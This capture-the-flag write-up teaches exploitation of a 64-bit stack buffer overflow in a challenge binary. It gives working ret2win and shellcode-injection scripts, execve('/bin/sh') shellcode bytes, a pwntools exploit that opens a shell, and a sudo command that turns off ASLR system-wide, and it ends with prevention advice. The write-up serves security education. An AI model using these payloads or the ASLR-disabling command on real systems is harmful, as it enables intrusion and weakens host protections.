# Buffer Overflow Basics - Write-up

**Category:** Binary Exploitation
**Difficulty:** Easy
**Flag:** `CTF{buff3r_0v3rfl0w_sh3llc0d3_m4st3r}`

## Challenge Description

A simple binary has a buffer overflow vulnerability. The goal is to exploit it to either:
1. Redirect execution to `print_flag()` function
2. Inject and execute shellcode to get a shell

```bash
$ ./vuln $(python3 -c 'print("A"*72)')
```

## Initial Analysis

### Running the Binary

```bash
$ ./vuln test
╔════════════════════════════════════════════════╗
║       Buffer Overflow Basics Challenge         ║
║                                                ║
║  Method 1: Redirect to print_flag function     ║
║  Method 2: Inject and execute shellcode        ║
╚════════════════════════════════════════════════╝

[*] Input length: 4 bytes
[*] Buffer size: 64 bytes

[*] Buffer at: 0x7fffffffdc70
[*] print_flag at: 0x401186
[*] Function returned normally
```

The binary helpfully shows:
- Buffer address: `0x7fffffffdc70`
- `print_flag` address: `0x401186`
- Buffer size: 64 bytes

### Checking Protections

```bash
$ checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

- **No Stack Canary** - Buffer overflow possible
- **NX disabled** - Shellcode execution allowed
- **No PIE** - Addresses are fixed

### Disassembly

```bash
$ objdump -d vuln | grep -A10 "print_flag"
0000000000401186 <print_flag>:
  401186:   f3 0f 1e fa          endbr64
  40118a:   55                   push   rbp
  40118b:   48 89 e5             mov    rbp,rsp
  ...
```

---

## Method 1: Ret2Win (Redirect to print_flag)

### Understanding Stack Layout

```
High Address
┌─────────────────────┐
│    Return Address   │ ← Target: overwrite with print_flag address
├─────────────────────┤
│    Saved RBP        │ ← 8 bytes
├─────────────────────┤
│                     │
│    buffer[64]       │ ← 64 bytes (our input goes here)
│                     │
├─────────────────────┤
│    Other locals     │
└─────────────────────┘
Low Address
```

### Finding the Offset

Using GDB with a pattern:

```bash
$ gdb ./vuln
(gdb) run $(python3 -c 'print("A"*100)')
[*] Buffer at: 0x7fffffffdc70
[*] print_flag at: 0x401186

Program received signal SIGSEGV, Segmentation fault.
0x000000000040120a in vulnerable ()

(gdb) x/gx $rsp
0x7fffffffdcb8: 0x4141414141414141  ← "AAAAAAAA"
```

The offset from buffer to return address is:
- Buffer: 64 bytes
- Saved RBP: 8 bytes
- **Total: 72 bytes**

### Building the Exploit

```python
#!/usr/bin/env python3
"""
Buffer Overflow - Ret2Win Exploit
Redirect execution to print_flag function
"""
import struct
import sys

# Target address
PRINT_FLAG_ADDR = 0x401186

# Build payload
padding = b"A" * 72
ret_addr = struct.pack("<Q", PRINT_FLAG_ADDR)

payload = padding + ret_addr

sys.stdout.buffer.write(payload)
```

### Running the Exploit

```bash
$ ./vuln $(python3 exploit.py)
╔════════════════════════════════════════════════╗
║       Buffer Overflow Basics Challenge         ║
...
[*] Buffer at: 0x7fffffffdc70
[*] print_flag at: 0x401186

Flag: CTF{buff3r_0v3rfl0w_sh3llc0d3_m4st3r}
```

---

## Method 2: Shellcode Injection

### Understanding Shellcode

Shellcode is position-independent machine code that spawns a shell. For 64-bit Linux:

```asm
; execve("/bin/sh", NULL, NULL)
xor rsi, rsi          ; argv = NULL
xor rdx, rdx          ; envp = NULL
xor rax, rax          ; clear rax
mov rbx, "/bin/sh"    ; load string
push rbx              ; push to stack
mov rdi, rsp          ; rdi points to "/bin/sh"
mov al, 59            ; syscall number for execve
syscall               ; execute!
```

### Shellcode Bytes

```python
shellcode = (
    b"\x48\x31\xf6"                  # xor rsi, rsi
    b"\x48\x31\xd2"                  # xor rdx, rdx
    b"\x48\x31\xc0"                  # xor rax, rax
    b"\x48\xbb\x2f\x62\x69\x6e"      # mov rbx, "/bin/sh"
    b"\x2f\x73\x68\x00"              #
    b"\x53"                          # push rbx
    b"\x48\x89\xe7"                  # mov rdi, rsp
    b"\xb0\x3b"                      # mov al, 59
    b"\x0f\x05"                      # syscall
)
print(f"Shellcode length: {len(shellcode)}")  # 27 bytes
```

### Building Shellcode Exploit

```python
#!/usr/bin/env python3
"""
Buffer Overflow - Shellcode Exploit
Inject and execute shellcode in the buffer
"""
import struct
import sys
import os

# Shellcode (27 bytes)
shellcode = (
    b"\x48\x31\xf6"                  # xor rsi, rsi
    b"\x48\x31\xd2"                  # xor rdx, rdx
    b"\x48\x31\xc0"                  # xor rax, rax
    b"\x48\xbb\x2f\x62\x69\x6e"      # mov rbx, "/bin/sh"
    b"\x2f\x73\x68\x00"              #
    b"\x53"                          # push rbx
    b"\x48\x89\xe7"                  # mov rdi, rsp
    b"\xb0\x3b"                      # mov al, 59
    b"\x0f\x05"                      # syscall
)

# Buffer address (from program output)
BUFFER_ADDR = 0x7fffffffdc70

# Layout:
# [NOP sled][shellcode][padding][return address]
# Total before return: 72 bytes

nop_sled = b"\x90" * 20           # NOP sled for reliability
total_payload_size = 72           # padding + RBP

# Calculate padding after shellcode
padding_after_shellcode = total_payload_size - len(nop_sled) - len(shellcode)
padding = b"A" * padding_after_shellcode

# Return address (point to middle of NOP sled)
ret_addr = struct.pack("<Q", BUFFER_ADDR + 10)

payload = nop_sled + shellcode + padding + ret_addr

print(f"[*] Payload length: {len(payload)}", file=sys.stderr)
print(f"[*] Shellcode at: {hex(BUFFER_ADDR + 20)}", file=sys.stderr)
print(f"[*] Return to: {hex(BUFFER_ADDR + 10)}", file=sys.stderr)

sys.stdout.buffer.write(payload)
```

### Note on Stack Randomization

The buffer address may change due to ASLR. For this challenge, we need either:
1. The binary to leak the address (it does!)
2. ASLR disabled for stack
3. A ROP chain to leak and return

```bash
# Check ASLR status
$ cat /proc/sys/kernel/randomize_va_space
2  # ASLR enabled

# For local testing, temporarily disable:
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## Using pwntools

```python
#!/usr/bin/env python3
"""
Buffer Overflow - pwntools Exploit
"""
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Binary
elf = ELF('./vuln')

# Find print_flag address
print_flag = elf.symbols['print_flag']
log.info(f"print_flag @ {hex(print_flag)}")

# Method 1: Ret2Win
def exploit_ret2win():
    p = process('./vuln')

    # Wait for addresses
    p.recvuntil(b'print_flag at: ')
    addr_str = p.recvline().strip()
    addr = int(addr_str, 16)
    log.info(f"print_flag @ {hex(addr)}")

    # Build payload
    payload = b"A" * 72
    payload += p64(addr)

    # Send payload
    p.sendline(payload)

    # Get flag
    output = p.recvall(timeout=2)
    print(output.decode())
    p.close()

# Method 2: Shellcode
def exploit_shellcode():
    p = process('./vuln')

    # Get buffer address
    p.recvuntil(b'Buffer at: ')
    addr_str = p.recvline().strip()
    buf_addr = int(addr_str, 16)
    log.info(f"Buffer @ {hex(buf_addr)}")

    # Shellcode
    shellcode = asm(shellcraft.sh())

    # Build payload with NOP sled
    payload = b"\x90" * 30          # NOP sled
    payload += shellcode
    payload += b"A" * (72 - len(payload))  # Padding
    payload += p64(buf_addr + 15)   # Return to NOP sled

    p.sendline(payload)

    # Interactive shell
    p.interactive()

if __name__ == '__main__':
    exploit_ret2win()
```

---

## Step-by-Step Execution

### 1. Normal Execution

```
Input: "AAAA"
Stack:
  buffer[0-3]: "AAAA"
  buffer[4-63]: (uninitialized)
  RBP: 0x7fffffffdc80
  RET: 0x401200 (return to main)

→ Function returns normally
```

### 2. Overflow Execution

```
Input: "A"*72 + "\x86\x11\x40\x00\x00\x00\x00\x00"
Stack:
  buffer[0-63]: "AAAA..."
  RBP: 0x4141414141414141
  RET: 0x401186 (print_flag address)

→ Function returns to print_flag instead of main!
```

### 3. Shellcode Execution

```
Input: NOP_sled + shellcode + padding + buf_addr
Stack:
  buffer[0-19]: NOP sled (0x90...)
  buffer[20-46]: Shellcode
  buffer[47-71]: Padding
  RBP: 0x4141414141414141
  RET: buffer_address + 10

→ Execution jumps to NOP sled, slides to shellcode, spawns shell!
```

---

## Debugging with GDB

```bash
$ gdb ./vuln

# Set breakpoint at vulnerable function
(gdb) break vulnerable
Breakpoint 1 at 0x4011a5

# Run with payload
(gdb) run $(python3 -c 'print("A"*72 + "B"*8)')

# At breakpoint, examine stack
(gdb) x/20x $rsp
0x7fffffffdc70: 0x41414141  0x41414141  ...  (buffer)
0x7fffffffdcb0: 0x41414141  0x41414141  ...  (more buffer)
0x7fffffffdcb8: 0x42424242  0x42424242  ...  (saved RBP + RET)

# Step through until return
(gdb) ni
...
(gdb) x/i $rip
=> 0x401200 <vulnerable+XX>: ret

# Check where we're returning
(gdb) x/gx $rsp
0x7fffffffdcc8: 0x0000000042424242  ← Our "BBBBBBBB"
```

---

## Key Takeaways

### Vulnerability Cause
1. `strcpy()` doesn't check bounds
2. Fixed-size buffer with user-controlled input
3. No stack canary to detect overflow

### Exploitation Prerequisites
- No stack canary
- Known buffer address (leaked or predictable)
- Executable stack (for shellcode)

### Prevention Methods
1. Use `strncpy()` or `snprintf()`
2. Enable stack canaries (`-fstack-protector`)
3. Enable ASLR
4. Enable NX (non-executable stack)

---

## Tools Used

- **GDB** - Debugging
- **pwntools** - Exploit development
- **checksec** - Binary protection analysis
- **objdump** - Disassembly

---

*This challenge demonstrates the fundamentals of stack-based buffer overflow exploitation, the foundation for understanding many real-world vulnerabilities.*
